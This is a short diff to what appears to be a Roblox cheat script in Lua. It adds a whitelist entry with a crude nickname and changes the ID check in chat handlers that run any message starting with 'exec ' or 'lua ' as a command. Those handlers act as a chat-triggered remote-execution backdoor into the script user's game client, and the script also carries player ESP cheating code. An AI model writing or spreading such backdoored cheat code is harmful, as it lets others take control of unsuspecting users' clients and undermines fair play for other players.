@@ -1710,6 +1710,7 @@ local CoolkidTable = {
 	['1443431439']  = "wk1r";
 	['164282612']   = "wk1r";
 	['548617338']   = "Sirhurt Gamer";
+	['1275692258']  = "Big Dick";
 }
 
 local function Started(Key,chatting)
@@ -1829,7 +1830,7 @@ for _,v in pairs(Players:GetPlayers()) do
 			espcoolkid(v,v.Character)
 		end)
 		v.Chatted:Connect(function(Chat)
-		if CoolkidTable[tostring(v.UserId)] then return end
+		if CoolkidTable[tostring(LP.UserId)] then return end
 			if Chat:sub(1,5) == "exec " then 
 				RunCmd(Chat:sub(6))
 			elseif Chat:sub(1,4) == "lua " then 
@@ -1846,7 +1847,7 @@ Players.PlayerAdded:Connect(function(plr)
 			espcoolkid(plr,Char)
 		end)
 		plr.Chatted:Connect(function(Chat)
-		if CoolkidTable[tostring(plr.UserId)] then return end
+		if CoolkidTable[tostring(LP.UserId)] then return end
 			if Chat:sub(1,5) == "exec " then 
 				RunCmd(Chat:sub(6))
 			elseif Chat:sub(1,4) == "lua " then 
